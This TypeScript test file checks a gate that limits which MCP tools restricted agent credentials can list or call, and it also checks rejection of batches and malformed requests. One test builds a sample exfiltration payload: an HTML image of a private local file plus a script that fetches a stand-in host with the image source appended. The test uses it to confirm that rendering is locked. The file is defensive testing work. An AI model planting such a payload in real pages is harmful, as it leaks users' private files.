// @effect-diagnostics preferSchemaOverJson:off
import { NodeHttpServer } from "@effect/platform-node";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { assert, describe, it } from "@effect/vitest";
import {
  CommandId,
  MessageId,
  type OrchestrationV2StoredEvent,
  ProjectId,
  SquireId,
  ThreadId,
} from "@lecturn/contracts";
import * as IdAllocator from "@lecturn/provider-core/server/IdAllocator";
import * as McpProviderSessions from "@lecturn/provider-core/server/McpProviderSessions";
import type { McpProviderSessionConfig } from "@lecturn/provider-core/server/mcpSession";
import { checkpointWorkspace } from "@lecturn/provider-testing/replayWorkspace";
import * as TestProviderHost from "@lecturn/provider-testing/TestProviderHost";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Option from "effect/Option";
import * as Stream from "effect/Stream";

import { squireToolAllowlist } from "../mcp/toolkits/squire/SquireMcpGate.ts";
import { makeScriptedAdapterV2 } from "../orchestration-v2/Adapters/ScriptedAdapterV2.ts";
import * as EffectWorker from "../orchestration-v2/EffectWorker.ts";
import * as Orchestrator from "../orchestration-v2/Orchestrator.ts";
import * as ProviderAdapterRegistry from "../orchestration-v2/ProviderAdapterRegistry.ts";
import * as ProviderReplayHarness from "../orchestration-v2/testkit/ProviderReplayHarness.ts";
import { SQUIRE_TOOL_NAMES } from "./squireToolNames.ts";
import { boundMcpProviderInstanceId, connectMcp, serveBoundMcp } from "./testkit/boundMcp.ts";

const squireId = SquireId.make("squire-gate");
const homeThreadId = ThreadId.make("thread-squire-home");
const normalThreadId = ThreadId.make("thread-ordinary");
const promise = <A>(run: () => Promise<A>) => Effect.promise(run);

const isRefusal = (answer: Record<string, unknown> | undefined) =>
  typeof (answer?.error as { message?: unknown } | undefined)?.message === "string" &&
  String((answer!.error as { message: string }).message).endsWith(
    "is not available on this thread.",
  );

/** Every tool the production `/mcp` registers, as an ordinary thread lists it. */
const listAllTools = (normal: McpProviderSessionConfig) =>
  promise(async () => (await connectMcp(normal)).listToolNames());

const htmlRenderArgs = { html: "<p>hi</p>", title: "Hi", height: 200 };
const HTML_TOOLS: ReadonlyArray<string> = ["html_preview", "html_render"];

type ToolResult = {
  readonly isError?: boolean;
  readonly content?: ReadonlyArray<{ readonly type: string; readonly text?: string }>;
};

const withBound = <A, E>(
  squireEnabled: boolean,
  body: (bound: Effect.Success<ReturnType<typeof serveBoundMcp>>) => Effect.Effect<A, E>,
) =>
  Effect.scoped(Effect.flatMap(serveBoundMcp({ squireEnabled }), body)).pipe(
    Effect.provide(NodeHttpServer.layerTest),
  );

describe("squireToolAllowlist", () => {
  it("is empty with the switch off and names only the role tools", () => {
    assert.deepEqual([...squireToolAllowlist("lead", false)], []);
    assert.deepEqual([...squireToolAllowlist("squire", false)], []);
    assert.deepEqual([...squireToolAllowlist("squire", true)], [...SQUIRE_TOOL_NAMES.squire]);
    assert.deepEqual([...squireToolAllowlist("lead", true)], [...SQUIRE_TOOL_NAMES.lead]);
    assert.deepEqual([...squireToolAllowlist(undefined, true)], []);
  });
});

describe("SquireMcpGate on the bound /mcp", () => {
  it.live("with the switch off, no Squire credential lists or calls any registered tool", () =>
    withBound(false, (bound) =>
      Effect.gen(function* () {
        const all = yield* listAllTools(yield* bound.issueNormal(normalThreadId));
        // The registry the gate fences: thread writes, actsAsCaller, preview and device tools.
        for (const name of [
          "lecturn_thread_send",
          "lecturn_pending_request_respond",
          "html_render",
          "delegate_task",
          "create_threads",
          "preview_status",
          "device_list",
        ]) {
          assert.include(all, name);
        }
        for (const role of ["lead", "squire"] as const) {
          const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
          const client = yield* promise(() => connectMcp(config));
          assert.deepEqual(yield* promise(() => client.listToolNames()), []);
          for (const name of all) {
            const { answer } = yield* promise(() => client.callTool(name, {}));
            assert.isTrue(isRefusal(answer), `${role} ${name}: ${JSON.stringify(answer)}`);
          }
        }
      }),
    ),
  );

  // No `SquireTools` here, so no role tool is served and only the gate shows.
  // The page tools pass it and reach the registered ones, which lock a Squire's page too.
  it.live("with the switch on, a Squire reaches no registered tool but the page tools", () =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const all = yield* listAllTools(yield* bound.issueNormal(normalThreadId));
        for (const role of ["lead", "squire"] as const) {
          const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
          const client = yield* promise(() => connectMcp(config));
          assert.sameMembers(yield* promise(() => client.listToolNames()), [...HTML_TOOLS]);
          for (const name of all.filter((name) => !HTML_TOOLS.includes(name))) {
            const { answer } = yield* promise(() => client.callTool(name, {}));
            assert.isTrue(isRefusal(answer), `${role} ${name}: ${JSON.stringify(answer)}`);
          }
        }
      }),
    ),
  );

  it.live("turning the switch off fences an open Squire session at its next request", () =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role: "lead" });
        const client = yield* promise(() => connectMcp(config));
        assert.sameMembers(yield* promise(() => client.listToolNames()), [...HTML_TOOLS]);

        yield* bound.setSquireEnabled(false);
        assert.deepEqual(yield* promise(() => client.listToolNames()), []);
        const { answer } = yield* promise(() => client.callTool("html_render", htmlRenderArgs));
        assert.isTrue(isRefusal(answer), JSON.stringify(answer));
      }),
    ),
  );

  // The ordinary html_render inlines a local image a page names, and its scripts can send it on.
  it.live("locks a Squire's page whatever the html_render arguments say", () =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const fileSystem = yield* FileSystem.FileSystem;
        const directory = yield* fileSystem.makeTempDirectoryScoped({
          prefix: "lecturn-squire-private-",
        });
        const privatePath = `${directory}/private.png`;
        yield* fileSystem.writeFile(
          privatePath,
          new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        );
        const args = {
          html: `<img src="${privatePath}"><script>fetch("https://example.invalid/?d=" + document.images[0].src)</script>`,
          title: "Leak",
          height: 200,
        };
        // An ordinary thread's page still inlines the image.
        const normalConfig = yield* bound.issueNormal(normalThreadId);
        const ordinary = yield* promise(async () =>
          (await connectMcp(normalConfig)).callTool("html_render", args),
        );
        const ordinaryResult = ordinary.answer?.result as { isError?: boolean } | undefined;
        assert.notEqual(ordinaryResult?.isError, true, JSON.stringify(ordinary.answer));
        for (const role of ["lead", "squire"] as const) {
          const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
          const client = yield* promise(() => connectMcp(config));
          // Arguments the tool does not declare cannot switch the lock off.
          for (const [name, extra] of [
            ["html_render", { locked: false }],
            ["html_preview", { locked: false, mode: "standard" }],
          ] as const) {
            const { answer } = yield* promise(() => client.callTool(name, { ...args, ...extra }));
            const result = answer?.result as ToolResult | undefined;
            assert.isTrue(result?.isError, `${role} ${name}: ${JSON.stringify(answer)}`);
            assert.include(result?.content?.[0]?.text, privatePath);
          }
        }
      }).pipe(Effect.scoped, Effect.provide(NodeServices.layer)),
    ),
  );

  it.live("refuses every non-tool method, batches and unparsable bodies for a Squire", () =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role: "lead" });
        const client = yield* promise(() => connectMcp(config));
        assert.deepEqual((yield* promise(() => client.request("ping"))).answer?.result, {});
        for (const method of [
          "resources/list",
          "resources/read",
          "resources/templates/list",
          "prompts/list",
          "prompts/get",
          "completion/complete",
          "logging/setLevel",
        ]) {
          const { answer } = yield* promise(() => client.request(method, { uri: "x", name: "x" }));
          assert.isTrue(isRefusal(answer), `${method}: ${JSON.stringify(answer)}`);
        }
        const batch = yield* promise(() =>
          client.post(
            JSON.stringify([
              { jsonrpc: "2.0", id: 90, method: "tools/call", params: { name: "html_render" } },
              {
                jsonrpc: "2.0",
                id: 91,
                method: "tools/call",
                params: { name: "lecturn_thread_send" },
              },
            ]),
          ),
        );
        assert.equal(batch.status, 400);
        assert.equal((batch.messages[0]?.error as { code?: number } | undefined)?.code, -32600);
        const garbage = yield* promise(() => client.post("{not json"));
        assert.equal(garbage.status, 400);
        assert.equal((garbage.messages[0]?.error as { code?: number } | undefined)?.code, -32700);
        // A tools/call sent as a notification has no id to answer, so it is refused too.
        const notification = yield* promise(() =>
          client.post(
            JSON.stringify({
              jsonrpc: "2.0",
              method: "tools/call",
              params: { name: "html_render", arguments: htmlRenderArgs },
            }),
          ),
        );
        assert.isTrue(isRefusal(notification.messages[0]));
      }),
    ),
  );

  it.live("leaves an ordinary thread credential untouched", () =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const normal = yield* bound.issueNormal(normalThreadId);
        const client = yield* promise(() => connectMcp(normal));
        const names = yield* promise(() => client.listToolNames());
        assert.include(names, "lecturn_thread_send");
        assert.include(names, "preview_status");
        const { answer } = yield* promise(() => client.callTool("html_render", htmlRenderArgs));
        assert.notEqual((answer?.result as { isError?: boolean })?.isError, true);
        const resources = yield* promise(() => client.request("resources/list"));
        assert.isFalse(isRefusal(resources.answer));
      }),
    ),
  );
});

// ── The scripted provider's own MCP client on a Squire credential ──

const scriptedInstanceId = boundMcpProviderInstanceId;
const scriptedThreadId = ThreadId.make("thread:squire-scripted");

const layerScripted = (config: McpProviderSessionConfig) =>
  ProviderReplayHarness.layerWithRegistry(
    { name: "squire-gate-scripted" },
    ProviderAdapterRegistry.layerFromAdaptersEffect(
      Effect.gen(function* () {
        // The harness clears the shared slot, so the adapter reads its own store.
        const sessions = yield* McpProviderSessions.McpProviderSessions;
        yield* sessions.set(config);
        return [yield* makeScriptedAdapterV2({ instanceId: scriptedInstanceId, environment: {} })];
      }).pipe(Effect.provide(Layer.fresh(McpProviderSessions.layer))),
    ).pipe(
      Layer.provide(Layer.mergeAll(IdAllocator.layer, TestProviderHost.layer())),
      Layer.provide(NodeServices.layer),
    ),
    { runEffectWorker: false },
  );

const fenced = (steps: ReadonlyArray<unknown>) =>
  `Run this.\n\n\`\`\`scripted\n${JSON.stringify(steps, null, 2)}\n\`\`\`\n`;

const runScriptedTurn = (message: string) =>
  Effect.gen(function* () {
    const orchestrator = yield* Orchestrator.OrchestratorV2;
    const worker = yield* EffectWorker.OrchestrationEffectWorkerV2;
    const cwd = yield* checkpointWorkspace("squire-gate-scripted");
    const modelSelection = { instanceId: scriptedInstanceId, model: "scripted" };
    yield* orchestrator.dispatch({
      type: "thread.create",
      commandId: CommandId.make("create"),
      threadId: scriptedThreadId,
      projectId: ProjectId.make("project:squire-scripted"),
      title: "Scripted",
      modelSelection,
      runtimeMode: "full-access",
      interactionMode: "default",
      branch: null,
      worktreePath: cwd,
      createdBy: "user",
      creationSource: "web",
    });
    yield* orchestrator.dispatch({
      type: "message.dispatch",
      commandId: CommandId.make("send"),
      threadId: scriptedThreadId,
      messageId: MessageId.make("message:squire-scripted"),
      text: message,
      attachments: [],
      dispatchMode: { type: "start_immediately" },
      createdBy: "user",
      creationSource: "web",
    });
    yield* worker.drain();
    const terminal = yield* orchestrator.streamStoredEvents.pipe(
      Stream.filter(
        (stored: OrchestrationV2StoredEvent) =>
          stored.event.type === "provider-turn.updated" &&
          ["completed", "interrupted", "failed", "cancelled"].includes(stored.event.payload.status),
      ),
      Stream.runHead,
    );
    assert.isTrue(Option.isSome(terminal));
    return (yield* orchestrator.getThreadProjection(scriptedThreadId)).turnItems.flatMap((item) =>
      item.type === "dynamic_tool" ? [{ toolName: item.toolName, status: item.status }] : [],
    );
  });

describe("SquireMcpGate through the scripted provider", () => {
  it.live.each([
    ["lead", "html_render", "completed"],
    ["lead", "lecturn_thread_send", "failed"],
    ["squire", "html_render", "completed"],
    ["squire", "preview_status", "failed"],
    ["squire", "device_list", "failed"],
    ["squire", "delegate_task", "failed"],
  ] as const)("a %s home thread's %s call is %s", ([role, tool, expected]) =>
    withBound(true, (bound) =>
      Effect.gen(function* () {
        const config = yield* bound.issueSquire({ threadId: scriptedThreadId, squireId, role });
        const rows = yield* runScriptedTurn(
          fenced([
            { toolCall: { name: tool, arguments: tool === "html_render" ? htmlRenderArgs : {} } },
          ]),
        ).pipe(Effect.scoped, Effect.provide(layerScripted(config)));
        assert.deepEqual(rows, [{ toolName: `lecturn.${tool}`, status: expected }]);
      }),
    ),
  );
});
